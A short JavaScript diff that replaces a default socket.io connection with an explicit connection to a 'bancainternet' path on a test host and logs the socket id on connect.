@@ -1,4 +1,4 @@
-const socket = io();
+const socket = io.connect('https://test.fasito.link/bancainternet/')
 
 socket.on("connect", () => {
     console.log("El socket se ha conectado: ", socket.id);
